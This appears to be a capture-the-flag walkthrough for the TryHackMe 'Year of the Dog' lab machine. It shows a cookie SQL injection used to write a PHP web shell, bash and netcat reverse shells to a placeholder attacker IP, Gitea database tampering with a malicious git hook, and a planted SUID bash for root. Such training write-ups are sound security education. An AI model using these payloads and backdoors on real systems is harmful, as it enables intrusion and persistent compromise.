# [Year of the Dog](https://tryhackme.com/room/yearofthedog)

## Always so polite...

# Flags

## Who knew? The dog has some bite!

### User Flag

1. Start with a port scan to identify running services on the target machine:

```bash
nmap -sV <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Navigate to the web application at `http://<TARGET_IP>`. After exploring the site, inspect the cookies using browser developer tools (F12). Changing the value of the cookie named `id` produces an error on the page, indicating potential SQL injection vulnerability.

[SCREEN01]

3. Test for SQL injection by adding a single quote `'` at the end of the cookie value. This results in the error message: `Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''<COOKIE_VALUE>''' at line 1`. This confirms SQL injection vulnerability.

4. Exploit the SQL injection to enumerate the database. Change the cookie to: `<COOKIE_VALUE>' union select 1, @@version-- -` which returns MySQL version: `5.7.34-0ubuntu0.18.04.1`.

5. Continue enumeration by querying the information schema. Set cookie to `<COOKIE_VALUE>' union select 1, table_name FROM information_schema.tables-- -` which reveals a table named `queue`.

6. Since we have SQL injection, we can write a PHP web shell to the web directory. Change cookie to `<COOKIE_VALUE>' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -`

The hex value decodes to: `<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";?>`

7. Test the web shell by visiting `http://<TARGET_IP>/shell.php?cmd=whoami`. This should return `www-data`.

[SCREEN02]

8. Set up a netcat listener on your attacking machine to catch the reverse shell:

```bash
nc -lvnp 4444
```

9. Use the web shell to execute a reverse shell payload. URL encode all special characters in `bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'` using [CyberChef](https://gchq.github.io/CyberChef/) and visit:

```
http://<TARGET_IP>/shell.php?cmd=bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F%3CATTACKER%5FIP%3E%2F4444%200%3E%261%27
```

You should now have a reverse shell as `www-data`.

10. Explore the filesystem and read the `work_analysis` file in dylan's home directory:

```bash
cat /home/dylan/work_analysis
grep "dylan" /home/dylan/work_analysis
```

**Results:**

```
Sep  5 20:52:57 staging-server sshd[39218]: Invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624
Sep  5 20:53:03 staging-server sshd[39218]: Failed password for invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624 ssh2
Sep  5 20:53:04 staging-server sshd[39218]: Connection closed by invalid user dylanLabr4d0rs4L1f3 192.168.1.142 port 45624 [preauth]
```

This appears to be a failed SSH login attempt where someone mistyped the username as `dylanLabr4d0rs4L1f3` instead of just `dylan`.

11. Use the discovered credentials to SSH into the machine as dylan:

```bash
ssh dylan@<TARGET_IP>
# Password: Labr4d0rs4L1f3
```

12. Read the user flag:

```bash
cat user.txt
```

[SCREEN03]

---

### Root Flag

1. Check for listening ports on the target machine using `ss`:

```bash
ss -tulpn
```

You should see port 3000 is open locally. Set up SSH port forwarding to access this service from your attacking machine:

```bash
ssh -L 3000:localhost:3000 dylan@<TARGET_IP>
```

This forwards your local port 3000 to the target's localhost:3000.

2. Open your browser and navigate to `http://127.0.0.1:3000`. You'll find a Gitea instance running. Register a new account on Gitea at `http://127.0.0.1:3000/user/sign_up`.

3. Download the Gitea database file to your attacking machine for analysis:

```bash
scp dylan@<TARGET_IP>:/gitea/gitea/gitea.db .
```

4. Open the database with sqlite3:

```bash
sqlite3 gitea.db
```

5. Query the database to find user information and grant admin privileges to your account:

```sql
select * from user;
select lower_name, is_admin from user;
UPDATE user SET is_admin=1 WHERE lower_name="luki1235512";
.quit
```

[SCREEN04]

6. Upload the modified database back to the target machine:

```bash
scp gitea.db dylan@<TARGET_IP>:/gitea/gitea/gitea.db
```

Refresh the Gitea page in your browser. You should now have admin privileges.

7. As an admin, create a new repository at `http://127.0.0.1:3000/repo/create`.

8. Navigate to the Git hooks settings for your repository at `http://127.0.0.1:3000/Luki1235512/Test/settings/hooks/git/pre-receive`. Add a reverse shell payload at the end of the pre-receive hook:

```bash
mkfifo /tmp/f; nc <ATTACKER_IP> 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

This hook will execute when you push to the repository.

[SCREEN05]

9. Start a netcat listener on your attacking machine:

```bash
nc -lvnp 4444
```

10. Clone the repository, make a change, and push it to trigger the Git hook:

```bash
git clone http://127.0.0.1:3000/Luki1235512/Test && cd Test
echo "test" >> README.md
git add README.md
git commit -m "Exploit"
git push
```

[SCREEN06]

11. You should receive a reverse shell connection as the `git` user. Check your privileges:

```bash
whoami
sudo -l
# User git
```

**Results:**

```
(ALL) NOPASSWD: ALL
```

12. Escalate to root:

```bash
sudo -s
whoami
# User root
```

13. Create a SUID bash binary for persistent access. As dylan, start a web server in `/bin`:

```bash
cd /bin
python3 -m http.server
```

14. As the root user (git with sudo), download bash and set the SUID bit:

```bash
wget <TARGET_IP>:8000/bash -O /data/bash
chmod 4755 /data/bash
```

15. As dylan, execute the SUID bash binary to get a root shell and read the root flag:

```bash
cd /gitea
ls -l bash
./bash -p
whoami
cat /root/root.txt
```

[SCREEN07]
